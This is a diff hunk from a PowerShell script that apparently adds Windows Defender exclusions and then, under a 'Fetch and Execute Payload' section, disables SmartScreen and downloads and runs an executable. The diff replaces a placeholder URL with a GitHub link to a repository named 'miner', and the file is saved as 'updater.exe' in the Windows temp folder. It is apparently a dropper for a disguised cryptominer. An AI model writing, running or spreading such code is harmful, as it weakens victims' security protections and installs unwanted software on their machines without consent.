@@ -121,7 +121,7 @@ foreach ($excl in $exclusions) {
 Add-Content -Path $logPath -Value "Finished attempting to add Windows Defender exclusions."
 
 # --- Fetch and Execute Payload ---
-$payloadUrl = "https://github.com/youruser/yourrepo/releases/download/v1.0/updater.exe" # <-- IMPORTANT: REPLACE WITH YOUR GITHUB RELEASE DIRECT LINK
+$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/test.exe" # <-- IMPORTANT: REPLACE WITH YOUR GITHUB RELEASE DIRECT LINK
 $payloadPath = "C:\Windows\Temp\updater.exe"
 
 Add-Content -Path $logPath -Value "Attempting to disable SmartScreen, fetch, and execute .exe payload from $payloadUrl."
